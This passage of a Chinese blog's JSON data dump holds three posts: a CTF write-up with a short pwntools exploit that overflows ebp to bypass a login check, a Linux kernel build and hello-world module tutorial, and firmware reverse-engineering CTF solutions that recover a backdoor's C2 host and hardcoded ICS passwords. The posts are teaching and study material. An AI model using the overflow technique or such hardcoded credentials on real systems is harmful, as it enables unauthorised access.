src=\"/img/pwnable_simple_login/2.jpg\"></p>\n<p>auth里v4只有8字节，因此可以使用12字节的input溢出到ebp里</p>\n<p>能够只溢出ebp就能控制执行流程的原理在于，此函数返回之后，上一级函数的栈底会被修改，而程序会通过自定义的这个栈底地址，+4去找到这个上级函数的返回地址，因此变相实现了返回地址的控制。</p>\n<p>本题目中将ebp指向input，那么input+4设置为correct函数地址就可以完成溢出</p>\n<p>另外，correct会验证前input前四个字节是不是deadbeef，因此payload由<code>0xdeadbeef</code>，<code>correct_addr</code>，<code>inputs_addr</code>三部分组成。</p>\n<p><strong>exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br><br>p = process(<span class=\"hljs-string\">&#x27;./login&#x27;</span>)<br><br>correct = <span class=\"hljs-number\">0x804925f</span><br>inputs = <span class=\"hljs-number\">0x811eb40</span><br>payload = base64.b64encode(p32(<span class=\"hljs-number\">0xdeadbeef</span>) + p32(correct) + p32(inputs))<br>p.recv()<br>sleep(<span class=\"hljs-number\">0.5</span>)<br>p.sendline(payload)<br>sleep(<span class=\"hljs-number\">0.5</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"linux kernel 学习","date":"2023-05-01T13:07:00.000Z","excerpt":"linux kernel","_content":"\n### ubuntu源码编译安装\n\n下载：https://www.kernel.org\n\n必要的编译环境，禁用证书\n\n```shell\nsudo apt-get install gcc g++ clang cmake make flex bison libssl-dev\nsudo apt-get install openssl\nsudo apt-get install libssl-dev libelf-dev \n./scripts/config --disable SYSTEM_TRUSTED_KEYS\n./scripts/config --disable SYSTEM_REVOCATION_KEYS\n```\n\n编译的配置\n\n```shell\nsudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit\n# 如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install\nsudo make -j4 #代表编译线程个数\n```\n\n安装\n\n```shell\nsudo make modules_install\nsudo make install\n```\n\n打开引导菜单\n\n```shell\nsudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10\nsudo update-grub\nsudo reboot\n```\n\n![](/img/kernel/1.jpg)\n\n多出了新安装的6.3.1的kernel\n\n重启之后`uname -ra`会发现内核版本变了\n\n### 驱动程序编写\n\n```c\n//hello.c\n#include <linux/init.h>\n#include <linux/module.h>\n\nMODULE_LICENSE(\"haidragon BSD/GPL\");\n\nstatic int hello_init(void){\n\tprintk(KERN_EMERG \"Load Hello World\\n\");\n    return 0;\n}\n\nstatic void hello exit(void)\n{\n    printk(KERN_EMERG \"Remove Hello world\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\n```makefile\n#Makefile\nKDIR:= /lib/modules/6.3.1/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\nclean:\n\trm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order\n```\n\n编译出来的`hello.ko`，用`insmod`安装，用`rmmod`卸载\n\n```shell\nsudo insmod ./hello.ko\ntail /var/log/kern.log #查看日志\nsudo rmmod ./hello.ko\ntail /var/log/kern.log #查看日志\n```\n\n","source":"_posts/linux kernel/linux kernel.md","raw":"---\ntitle: linux kernel 学习\ntags: [驱动开发,kernel漏洞]\ndate: 2023-05-1 21:07:00\ncategories: [linux kernel]\nexcerpt: linux kernel\n---\n\n### ubuntu源码编译安装\n\n下载：https://www.kernel.org\n\n必要的编译环境，禁用证书\n\n```shell\nsudo apt-get install gcc g++ clang cmake make flex bison libssl-dev\nsudo apt-get install openssl\nsudo apt-get install libssl-dev libelf-dev \n./scripts/config --disable SYSTEM_TRUSTED_KEYS\n./scripts/config --disable SYSTEM_REVOCATION_KEYS\n```\n\n编译的配置\n\n```shell\nsudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit\n# 如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install\nsudo make -j4 #代表编译线程个数\n```\n\n安装\n\n```shell\nsudo make modules_install\nsudo make install\n```\n\n打开引导菜单\n\n```shell\nsudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10\nsudo update-grub\nsudo reboot\n```\n\n![](/img/kernel/1.jpg)\n\n多出了新安装的6.3.1的kernel\n\n重启之后`uname -ra`会发现内核版本变了\n\n### 驱动程序编写\n\n```c\n//hello.c\n#include <linux/init.h>\n#include <linux/module.h>\n\nMODULE_LICENSE(\"haidragon BSD/GPL\");\n\nstatic int hello_init(void){\n\tprintk(KERN_EMERG \"Load Hello World\\n\");\n    return 0;\n}\n\nstatic void hello exit(void)\n{\n    printk(KERN_EMERG \"Remove Hello world\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_exit);\n```\n\n```makefile\n#Makefile\nKDIR:= /lib/modules/6.3.1/build\nall:\n\tmake -C $(KDIR) M=$(PWD) modules\nclean:\n\trm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order\n```\n\n编译出来的`hello.ko`，用`insmod`安装，用`rmmod`卸载\n\n```shell\nsudo insmod ./hello.ko\ntail /var/log/kern.log #查看日志\nsudo rmmod ./hello.ko\ntail /var/log/kern.log #查看日志\n```\n\n","slug":"linux kernel/linux kernel","published":1,"updated":"2023-05-05T11:50:44.465Z","_id":"clh5rzm970000zcuf891ifgzr","comments":1,"layout":"post","photos":[],"link":"","content":"<h3 id=\"ubuntu源码编译安装\"><a href=\"#ubuntu源码编译安装\" class=\"headerlink\" title=\"ubuntu源码编译安装\"></a>ubuntu源码编译安装</h3><p>下载：<a href=\"https://www.kernel.org/\">https://www.kernel.org</a></p>\n<p>必要的编译环境，禁用证书</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure>\n\n<p>编译的配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit<br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install</span><br>sudo make -j4 #代表编译线程个数<br></code></pre></td></tr></table></figure>\n\n<p>安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure>\n\n<p>打开引导菜单</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/kernel/1.jpg\"></p>\n<p>多出了新安装的6.3.1的kernel</p>\n<p>重启之后<code>uname -ra</code>会发现内核版本变了</p>\n<h3 id=\"驱动程序编写\"><a href=\"#驱动程序编写\" class=\"headerlink\" title=\"驱动程序编写\"></a>驱动程序编写</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">//hello.c</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/init.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class=\"hljs-string\">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">hello_init</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span>&#123;<br>\tprintk(KERN_EMERG <span class=\"hljs-string\">&quot;Load Hello World\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">void</span> hello <span class=\"hljs-title function_\">exit</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class=\"hljs-string\">&quot;Remove Hello world\\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs makefile\"><span class=\"hljs-comment\">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class=\"hljs-section\">all:</span><br>\tmake -C <span class=\"hljs-variable\">$(KDIR)</span> M=<span class=\"hljs-variable\">$(PWD)</span> modules<br><span class=\"hljs-section\">clean:</span><br>\trm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure>\n\n<p>编译出来的<code>hello.ko</code>，用<code>insmod</code>安装，用<code>rmmod</code>卸载</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo insmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"more":"<h3 id=\"ubuntu源码编译安装\"><a href=\"#ubuntu源码编译安装\" class=\"headerlink\" title=\"ubuntu源码编译安装\"></a>ubuntu源码编译安装</h3><p>下载：<a href=\"https://www.kernel.org/\">https://www.kernel.org</a></p>\n<p>必要的编译环境，禁用证书</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo apt-get install gcc g++ clang cmake make flex bison libssl-dev<br>sudo apt-get install openssl<br>sudo apt-get install libssl-dev libelf-dev <br>./scripts/config --disable SYSTEM_TRUSTED_KEYS<br>./scripts/config --disable SYSTEM_REVOCATION_KEYS<br></code></pre></td></tr></table></figure>\n\n<p>编译的配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo make menuconfig # 最大化终端，否则图形界面显示不出来，使用默认配置直接save然后exit<br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">如果不把Enbale loadable module support 勾上，生成的.config就不能modules_install</span><br>sudo make -j4 #代表编译线程个数<br></code></pre></td></tr></table></figure>\n\n<p>安装</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo make modules_install<br>sudo make install<br></code></pre></td></tr></table></figure>\n\n<p>打开引导菜单</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo gedit /etc/default/grub # 注释hidden项，修改停留时间GRUB_TIMEOUT=10<br>sudo update-grub<br>sudo reboot<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/kernel/1.jpg\"></p>\n<p>多出了新安装的6.3.1的kernel</p>\n<p>重启之后<code>uname -ra</code>会发现内核版本变了</p>\n<h3 id=\"驱动程序编写\"><a href=\"#驱动程序编写\" class=\"headerlink\" title=\"驱动程序编写\"></a>驱动程序编写</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs c\"><span class=\"hljs-comment\">//hello.c</span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/init.h&gt;</span></span><br><span class=\"hljs-meta\">#<span class=\"hljs-keyword\">include</span> <span class=\"hljs-string\">&lt;linux/module.h&gt;</span></span><br><br>MODULE_LICENSE(<span class=\"hljs-string\">&quot;haidragon BSD/GPL&quot;</span>);<br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">hello_init</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span>&#123;<br>\tprintk(KERN_EMERG <span class=\"hljs-string\">&quot;Load Hello World\\n&quot;</span>);<br>    <span class=\"hljs-keyword\">return</span> <span class=\"hljs-number\">0</span>;<br>&#125;<br><br><span class=\"hljs-type\">static</span> <span class=\"hljs-type\">void</span> hello <span class=\"hljs-title function_\">exit</span><span class=\"hljs-params\">(<span class=\"hljs-type\">void</span>)</span><br>&#123;<br>    printk(KERN_EMERG <span class=\"hljs-string\">&quot;Remove Hello world\\n&quot;</span>);<br>&#125;<br><br>module_init(hello_init);<br>module_exit(hello_exit);<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight makefile\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs makefile\"><span class=\"hljs-comment\">#Makefile</span><br>KDIR:= /lib/modules/6.3.1/build<br><span class=\"hljs-section\">all:</span><br>\tmake -C <span class=\"hljs-variable\">$(KDIR)</span> M=<span class=\"hljs-variable\">$(PWD)</span> modules<br><span class=\"hljs-section\">clean:</span><br>\trm -f *.ko *.o *.mod.o *.mod.c *.symvers *.order<br></code></pre></td></tr></table></figure>\n\n<p>编译出来的<code>hello.ko</code>，用<code>insmod</code>安装，用<code>rmmod</code>卸载</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">sudo insmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br>sudo rmmod ./hello.ko<br>tail /var/log/kern.log #查看日志<br></code></pre></td></tr></table></figure>\n\n"},{"title":"固件逆向","date":"2023-05-10T07:58:00.000Z","excerpt":"各个网站上的固件逆向题目","_content":"\n#### 题目1-buuctf-firmware\n\nhttps://buuoj.cn/challenges#firmware\n\n![](/img/firmware/1.jpg)\n\n使用binwalk提取固件\n\n![](/img/firmware/2.jpg)\n\n可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序\n\n![](/img/firmware/3.jpg)\n\n用upx脱壳后寻找类似网址的字符串，找到以下三个\n\n![](/img/firmware/4.jpg)\n\n首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个\n\n![](/img/firmware/5.jpg)\n\n第二个、第三个只出现在send函数发送的字符串里，显然不对\n\n![](/img/firmware/6.jpg)\n\n![](/img/firmware/7.jpg)\n\n因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}\n\n\n\n#### 题目2-CTFHUB-二次设备固件逆向\n\n直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串\n\n![](/img/firmware/8.jpg)\n\n打开JZPHMISystem，搜索password字符串\n\n![](/img/firmware/9.jpg)\n\n按x找引用到这里，发现了一个叫做inputPassword的函数\n\n![](/img/firmware/10.jpg)\n\n这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数\n\n![](/img/firmware/11.jpg)\n\n双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码\n\n然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程\n\n只不过在rootPasswd这里存在区别\n\n![](/img/firmware/12.jpg)\n\n把这个icspwd提交上去就是对的。。。前面那个689078就不行\n\n\n\n#### 题目3-CTFHUB-简单的固件逆向分析\n\n用tree查看文件结构之后发现有用的二进制文件只有一个`wwwroot/conf/exec/NOE7701.bin`\n\n使用binwalk提取出来217和217.zlib两个文件\n\n用binwalk -A查看217的架构，发现是PowerPC big-endian\n\n![](/img/firmware/13.jpg)\n\n接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 https://www.cnblogs.com/yangmzh3/p/11231423.html\n\n![](/img/firmware/13_.jpg)\n\n用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址\n\n![](/img/firmware/14.jpg)\n\n![](/img/firmware/15.jpg)\n\n发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名\n\n从网上找了这个idc脚本，用于恢复VxWorks符号表\n\n```c\n/* 脚本内容 */\n/* Ruben Santamarta - IOActive */\n/* Rebuild VxWorks Symbol Table */\n\n#include <idc.idc>\n\nstatic main()\n{\n     auto load_addr;\n\t auto ea;\n\t auto offset;\n\t auto sName;\n\t auto eaStart;\n\t auto eaEnd; \n\n\t// You'll need to adjust these values\n\tload_addr = 0x10000; /* 加载地址 */ \n\teaStart = 0x301E74 + load_addr; /* 符号表起始地 */\n\teaEnd = 0x3293b4 + load_addr; /* 符号表结束地址 */\n\t\n\t SetStatus(IDA_STATUS_WORK);\n\t ea = eaStart;\n\t \n\t while( ea < eaEnd) {\n\t \tMakeDword( ea );\n\t \toffset = 0;\n\t \tif ( Dword( ea ) == 0x900 || Dword( ea ) == 0x500)\n\t \t{\n\t \t\toffset = 8;\n\t \t}\n\t \telse if( Dword( ea ) == 0x90000 || Dword( ea ) == 0x50000 )\n\t \t{\t\n\t \t\toffset = 0xc;\n\t \t}\t \t\n\t \tif( offset )\n\t \t{\n\t \t\tMakeStr( Dword( ea - offset ), BADADDR);\t \t\t\n\t \t\tsName = GetString( Dword( ea - offset ), -1, ASCSTR_C ) ; \n\t \t \tif ( sName )\n\t \t \t{\n\t \t \t\tif( Dword( ea ) == 0x500 || Dword( ea ) == 0x50000)\n\t \t \t\t{\n\t \t \t    \tif (  GetFunctionName( Dword( ea - offset + 4) ) == \"\" )\n\t \t \t    \t{\n\t \t \t    \t\tMakeCode( Dword( ea - offset + 4) );\n\t \t\t\t\t\tMakeFunction( Dword( ea - offset + 4), BADADDR );\t\n\t \t \t    \t}\n\t \t \t    }\n\t \t \t\tMakeName( Dword( ea - offset + 4 ), sName ); \t \t\t\n\t \t \t}\n\t \t}\n\t \tea = ea + 4; \t \t \t\n\t }\n\t \n\t SetStatus(IDA_STATUS_READY);\n}\n```\n\n导入之后函数确实恢复出来了\n\n如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案...\n\n![](/img/firmware/16.jpg)\n\n不做具体分析了（代码太多","source":"_posts/固件仿真/ctf-firmware.md","raw":"---\ntitle: 固件逆向\ntags: [firmware analysis]\ndate: 2023-05-10 15:58:00\ncategories: [固件仿真]\nexcerpt: 各个网站上的固件逆向题目\n---\n\n#### 题目1-buuctf-firmware\n\nhttps://buuoj.cn/challenges#firmware\n\n![](/img/firmware/1.jpg)\n\n使用binwalk提取固件\n\n![](/img/firmware/2.jpg)\n\n可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序\n\n![](/img/firmware/3.jpg)\n\n用upx脱壳后寻找类似网址的字符串，找到以下三个\n\n![](/img/firmware/4.jpg)\n\n首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个\n\n![](/img/firmware/5.jpg)\n\n第二个、第三个只出现在send函数发送的字符串里，显然不对\n\n![](/img/firmware/6.jpg)\n\n![](/img/firmware/7.jpg)\n\n因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}\n\n\n\n#### 题目2-CTFHUB-二次设备固件逆向\n\n直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串\n\n![](/img/firmware/8.jpg)\n\n打开JZPHMISystem，搜索password字符串\n\n![](/img/firmware/9.jpg)\n\n按x找引用到这里，发现了一个叫做inputPassword的函数\n\n![](/img/firmware/10.jpg)\n\n这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数\n\n![](/img/firmware/11.jpg)\n\n双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码\n\n然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程\n\n只不过在rootPasswd这里存在区别\n\n![](/img/firmware/12.jpg)\n\n把这个icspwd提交上去就是对的。。。前面那个689078就不行\n\n\n\n#### 题目3-CTFHUB-简单的固件逆向分析\n\n用tree查看文件结构之后发现有用的二进制文件只有一个`wwwroot/conf/exec/NOE7701.bin`\n\n使用binwalk提取出来217和217.zlib两个文件\n\n用binwalk -A查看217的架构，发现是PowerPC big-endian\n\n![](/img/firmware/13.jpg)\n\n接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 https://www.cnblogs.com/yangmzh3/p/11231423.html\n\n![](/img/firmware/13_.jpg)\n\n用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址\n\n![](/img/firmware/14.jpg)\n\n![](/img/firmware/15.jpg)\n\n发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名\n\n从网上找了这个idc脚本，用于恢复VxWorks符号表\n\n```c\n/* 脚本内容 */\n/* Ruben Santamarta - IOActive */\n/* Rebuild VxWorks Symbol Table */\n\n#include <idc.idc>\n\nstatic main()\n{\n     auto load_addr;\n\t auto ea;\n\t auto offset;\n\t auto sName;\n\t auto eaStart;\n\t auto eaEnd; \n\n\t// You'll need to adjust these values\n\tload_addr = 0x10000; /* 加载地址 */ \n\teaStart = 0x301E74 + load_addr; /* 符号表起始地 */\n\teaEnd = 0x3293b4 + load_addr; /* 符号表结束地址 */\n\t\n\t SetStatus(IDA_STATUS_WORK);\n\t ea = eaStart;\n\t \n\t while( ea < eaEnd) {\n\t \tMakeDword( ea );\n\t \toffset = 0;\n\t \tif ( Dword( ea ) == 0x900 || Dword( ea ) == 0x500)\n\t \t{\n\t \t\toffset = 8;\n\t \t}\n\t \telse if( Dword( ea ) == 0x90000 || Dword( ea ) == 0x50000 )\n\t \t{\t\n\t \t\toffset = 0xc;\n\t \t}\t \t\n\t \tif( offset )\n\t \t{\n\t \t\tMakeStr( Dword( ea - offset ), BADADDR);\t \t\t\n\t \t\tsName = GetString( Dword( ea - offset ), -1, ASCSTR_C ) ; \n\t \t \tif ( sName )\n\t \t \t{\n\t \t \t\tif( Dword( ea ) == 0x500 || Dword( ea ) == 0x50000)\n\t \t \t\t{\n\t \t \t    \tif (  GetFunctionName( Dword( ea - offset + 4) ) == \"\" )\n\t \t \t    \t{\n\t \t \t    \t\tMakeCode( Dword( ea - offset + 4) );\n\t \t\t\t\t\tMakeFunction( Dword( ea - offset + 4), BADADDR );\t\n\t \t \t    \t}\n\t \t \t    }\n\t \t \t\tMakeName( Dword( ea - offset + 4 ), sName ); \t \t\t\n\t \t \t}\n\t \t}\n\t \tea = ea + 4; \t \t \t\n\t }\n\t \n\t SetStatus(IDA_STATUS_READY);\n}\n```\n\n导入之后函数确实恢复出来了\n\n如果直接搜ftpuser字符串，它下面这个就是密码，也就是flag答案...\n\n![](/img/firmware/16.jpg)\n\n不做具体分析了（代码太多","slug":"固件仿真/ctf-firmware","published":1,"updated":"2023-05-12T05:45:02.503Z","_id":"clhizl22700008oufhl3ybqnn","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"题目1-buuctf-firmware\"><a href=\"#题目1-buuctf-firmware\" class=\"headerlink\" title=\"题目1-buuctf-firmware\"></a>题目1-buuctf-firmware</h4><p><a href=\"https://buuoj.cn/challenges#firmware\">https://buuoj.cn/challenges#firmware</a></p>\n<p><img src=\"/img/firmware/1.jpg\"></p>\n<p>使用binwalk提取固件</p>\n<p><img src=\"/img/firmware/2.jpg\"></p>\n<p>可以找到squashfs文件系统，并且可以在/tmp路径下可以找到名为backdoor的程序</p>\n<p><img src=\"/img/firmware/3.jpg\"></p>\n<p>用upx脱壳后寻找类似网址的字符串，找到以下三个</p>\n<p><img src=\"/img/firmware/4.jpg\"></p>\n<p>首先看第一个，它出现在initConnection这个函数，并且建立了这个url的36667端口链接，大概率题目找的就是这个</p>\n<p><img src=\"/img/firmware/5.jpg\"></p>\n<p>第二个、第三个只出现在send函数发送的字符串里，显然不对</p>\n<p><img src=\"/img/firmware/6.jpg\"></p>\n<p><img src=\"/img/firmware/7.jpg\"></p>\n<p>因此flag = {MD5(echo.byethost51.com:36667)} = {33a422c45d551ac6e4756f59812a954b}</p>\n<h4 id=\"题目2-CTFHUB-二次设备固件逆向\"><a href=\"#题目2-CTFHUB-二次设备固件逆向\" class=\"headerlink\" title=\"题目2-CTFHUB-二次设备固件逆向\"></a>题目2-CTFHUB-二次设备固件逆向</h4><p>直接打开提供的压缩包，只有一个home文件夹，由于题目中说要找硬编码字符串，直接在文件夹里搜索password之类的字符串</p>\n<p><img src=\"/img/firmware/8.jpg\"></p>\n<p>打开JZPHMISystem，搜索password字符串</p>\n<p><img src=\"/img/firmware/9.jpg\"></p>\n<p>按x找引用到这里，发现了一个叫做inputPassword的函数</p>\n<p><img src=\"/img/firmware/10.jpg\"></p>\n<p>这个函数调用了InputPwd_pro，然后在这个函数里找类似strcmp的函数</p>\n<p><img src=\"/img/firmware/11.jpg\"></p>\n<p>双击这个689078字符串，发现他的名字叫做rootPasswd，那么猜测可能这个就是题目要求的密码</p>\n<p>然后打开另一个能搜到password的文件，发现这两个几乎是同样的结构流程</p>\n<p>只不过在rootPasswd这里存在区别</p>\n<p><img src=\"/img/firmware/12.jpg\"></p>\n<p>把这个icspwd提交上去就是对的。。。前面那个689078就不行</p>\n<h4 id=\"题目3-CTFHUB-简单的固件逆向分析\"><a href=\"#题目3-CTFHUB-简单的固件逆向分析\" class=\"headerlink\" title=\"题目3-CTFHUB-简单的固件逆向分析\"></a>题目3-CTFHUB-简单的固件逆向分析</h4><p>用tree查看文件结构之后发现有用的二进制文件只有一个<code>wwwroot/conf/exec/NOE7701.bin</code></p>\n<p>使用binwalk提取出来217和217.zlib两个文件</p>\n<p>用binwalk -A查看217的架构，发现是PowerPC big-endian</p>\n<p><img src=\"/img/firmware/13.jpg\"></p>\n<p>接下来识别固件的加载地址，通常vxworks内核加载地址为0x10000，但是关于如何验证，见 <a href=\"https://www.cnblogs.com/yangmzh3/p/11231423.html\">https://www.cnblogs.com/yangmzh3/p/11231423.html</a></p>\n<p><img src=\"/img/firmware/13_.jpg\"></p>\n<p>用ida打开，选择PowerPC big-endian[PPC]，使用0x10000作为固件加载地址</p>\n<p><img src=\"/img/firmware/14.jpg\"></p>\n<p><img src=\"/img/firmware/15.jpg\"></p>\n<p>发现ida识别不出来函数，由于固件里编入了符号表，可以手动恢复函数名</p>\n<p>从网上找了这个idc脚本，用于恢复VxWorks符号表</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 